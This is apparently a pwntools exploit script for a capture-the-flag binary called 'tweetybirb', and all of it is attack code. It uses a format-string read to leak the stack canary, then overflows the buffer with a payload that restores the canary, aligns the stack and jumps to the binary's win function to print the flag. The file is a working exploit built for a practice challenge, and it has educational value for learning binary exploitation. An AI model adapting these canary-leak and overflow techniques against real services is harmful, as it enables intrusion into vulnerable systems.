from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break *0x4011de
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './tweetybirb'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 72  # IP offset
ret = 0x40101a  # Stack alignment

# Leak canary value (15th on stack)
io.sendlineafter('magpies?', '%{}$p'.format(15))
io.recvline()
canary = int(io.recvline().strip(), 16)
info('canary = 0x%x (%d)', canary, canary)

payload = flat([
    offset * asm('nop'),
    canary,
    8 * asm('nop'),
    ret,
    elf.symbols.win
])

# Send the payload
io.sendlineafter('fowl?', payload)
io.recvline()

# Get our flag!
flag = io.recv()
success(flag)
